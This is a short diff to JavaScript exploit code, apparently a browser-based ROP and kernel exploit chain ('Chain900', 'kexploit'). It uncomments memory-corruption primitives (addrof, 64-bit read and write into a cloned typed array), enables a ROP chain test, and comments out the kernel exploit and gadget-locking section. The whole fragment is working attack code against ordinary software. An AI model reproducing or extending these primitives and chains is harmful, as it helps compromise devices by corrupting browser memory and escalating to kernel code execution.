@@ -489,11 +489,11 @@ class Chain900 extends Chain900Base {
         const ta_clone = {};
         this.ta_clone = ta_clone;
         const clone_p = mem.addrof(ta_clone);
-        /*const ta_p = mem.addrof(rop_ta);
+        const ta_p = mem.addrof(rop_ta);
 
         for (let i = js_size; i < js_ta_size; i += 8) {
             clone_p.write64(i, ta_p.read64(i));
-        }*/
+        }
 
         const webcore_ta = ta_p.readp(offset_textarea_impl);
         const m_wrapped_clone = new Uint8Array(
@@ -682,10 +682,10 @@ function test_rop(Chain) {
     }
 }
 
-//debug_log('Chain900');
-//test_rop(Chain);
+debug_log('Chain900');
+test_rop(Chain);
 
-function mlock_gadgets(gadgets) {
+/*function mlock_gadgets(gadgets) {
     const chain = new Chain();
 
     for (const [gadget, addr] of gadgets) {
@@ -1207,4 +1207,4 @@ async function kexploit() {
     await kexec_payload(kchain, sd, mmap_area, scratch);
 }
 
-kexploit();
+kexploit();*/
